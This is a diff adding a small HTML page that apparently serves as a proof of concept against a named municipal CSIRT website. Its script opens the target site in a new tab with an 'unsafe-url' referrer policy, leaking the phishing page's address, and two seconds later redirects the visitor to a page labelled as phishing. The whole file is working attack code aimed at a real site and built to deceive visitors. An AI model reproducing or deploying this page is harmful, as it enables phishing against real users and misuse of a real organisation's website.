@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="unsafe-url">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <h1>⏳ Loading...</h1>
+    <p>Redirecting to CSIRT...</p>
+    <script>
+        // Kirim request CSIRT dengan Referer phishing page
+        const targetUrl = 'https://csirt.banjarmasinkota.go.id/core/i18n/ko/';
+        const phishingUrl = 'https://xxisem9090.github.io/open-redirect-poc/phishing.html';
+
+        // Option 1: Open CSIRT in new tab with referer
+        const link = document.createElement('a');
+        link.href = targetUrl;
+        link.target = '_blank';
+        link.referrerPolicy = 'unsafe-url';
+        link.click();
+
+        // Option 2: Redirect to phishing page after 2 seconds
+        setTimeout(() => {
+            window.location.href = phishingUrl;
+        }, 2000);
+    </script>
+</body>
+</html>
